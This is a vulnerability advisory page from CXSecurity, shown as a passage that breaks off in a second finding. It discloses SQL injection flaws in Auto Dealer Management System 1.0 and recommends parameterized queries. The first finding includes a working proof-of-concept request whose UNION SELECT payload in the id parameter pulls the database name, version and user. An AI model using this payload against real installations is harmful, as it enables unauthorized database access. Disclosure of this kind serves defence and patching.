---
title: Auto Dealer Management System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023020045
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-27
fetch_date: 2025-10-04T08:09:47.349246
---

# Auto Dealer Management System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Auto Dealer Management System 1.0 SQL Injection** **2023.02.26**  Credit:  **[Navaid Ansari](https://cxsecurity.com/author/Navaid%2BAnsari/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-0912](https://cxsecurity.com/cveshow/CVE-2023-0912/ "Click to see CVE-2023-0912")** | **[CVE-2023-0913](https://cxsecurity.com/cveshow/CVE-2023-0913/ "Click to see CVE-2023-0913")** | **[CVE-2023-0915](https://cxsecurity.com/cveshow/CVE-2023-0915/ "Click to see CVE-2023-0915")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Auto Dealer Management System - SQL Injection on page view\_transaction.php and parameter is id, application url is (?page=vehicles/view\_transaction&id=?) with low privilege authentication
### Date:
> 18 February 2023
### CVE Assigned:
\*\*[CVE-2023-0912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0912)\*\* [mitre.org](https://www.cve.org/CVERecord?id=CVE-2023-0912) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2023-0912)
### Author Name:
> Muhammad Navaid Zafar Ansari
### Author Email:
> navaidnasari@hotmail.co.uk
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Auto Dealer Management System](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### SQL Injection
> SQL Injection is a type of vulnerability in web applications that allows an attacker to execute unauthorized SQL queries on the database by exploiting the application's failure to properly validate user input. The attacker can use this vulnerability to bypass the security measures put in place by the application, allowing them to access or modify sensitive data, or even take control of the entire system. SQL Injection attacks can have severe consequences, including data loss, financial loss, reputational damage, and legal liability. To prevent SQL Injection attacks, developers should properly sanitize and validate all user input, and implement strong security measures, such as input validation, output encoding, parameterized queries, and access controls. Users should also be aware of the risks of SQL Injection attacks and take appropriate measures to protect their data.
### Affected Page:
> view\_transaction.php
> On this page id parameter is vulnerable to SQL Injection Attack
> URL of the vulnerable parameter is: ?page=vehicles/view\_transaction&id=\*
### Description:
> The auto dealer management system supports two roles of users, one is admin, and another is a normal employee. the detail of role is given below
+ Admin user has full access to the system
+ Employee user has only a few menu access i.e. dashboard, car models and vehicle (available and transaction)
> Employee could perform the SQL Injection by viewing the vehicle transaction from his/her profile. Therefore, low-privileged users could able to get the access full system.
### Proof of Concept:
> Following steps are involved:
+ An employee view the vehicle transaction and could perform the SQL injection with vulnerable parameter (?page=vehicles/view\_transaction&id=5\*)
### Request:
```
GET /adms/admin/?page=vehicles/view\_transaction&id=5%27+and+false+union+select+1,2,3,4,5,6,7,8,9,database(),version(),12,13,user()--+- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="109", "Not\_A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c1ig2qf0q44toal7cqbqvikli5
Connection: close
```
### Response:
![image](https://user-images.githubusercontent.com/123810418/219882001-6031474c-b28b-4401-b282-6ff470086be3.png)
### Recommendation:
> Whoever uses this CMS, should update the code of the application in to parameterized queries to avoid SQL Injection attack:
```
Example Code:
$sql = $obj\_admin->db->prepare("SELECT \*, concat(firstname,' ',COALESCE(concat(middlename,' '), ''), lastname) as customer from `transaction\_list` where id = :id ");
$sql->bindparam(':id', $id);
$sql->execute();
$row = $sql->fetch(PDO::FETCH\_ASSOC);
```
Thank you for reading for more demo visit my github: https://github.com/navaidzansari/CVE\_Demo
--------------------------------------------------------------------------
# Auto Dealer Management System - SQL Injection on page sell\_vehicle.php and parameter is id, application url is (?page=vehicles/sell\_vehicle&id=?) with low privilege authentication
### Date:
> 18 February 2023
### CVE Assigned:
\*\*[CVE-2023-0913](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0913)\*\* [mitre.org](https://www.cve.org/CVERecord?id=CVE-2023-0913) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2023-0913)
### Author Name:
> Muhammad Navaid Zafar Ansari
### Author Email:
> navaidnasari@hotmail.co.uk
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Auto Dealer Management System](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### SQL Injection
> SQL Injection is a type of vulnerability in web applications that allows an attacker to execute unauthorized SQL queries on the database by exploiting the application's failure to properly validate user input. The attacker can use this vulnerability to bypass the security measures put in place by the application, allowing them to access or modify sensitive data, or even take control of the entire system. SQL Injection attacks can have severe consequences, including data loss, financial loss, reputational damage, and legal liability. To prevent SQL Injection attacks, developers should properly sanitize and validate all user input, and implement str...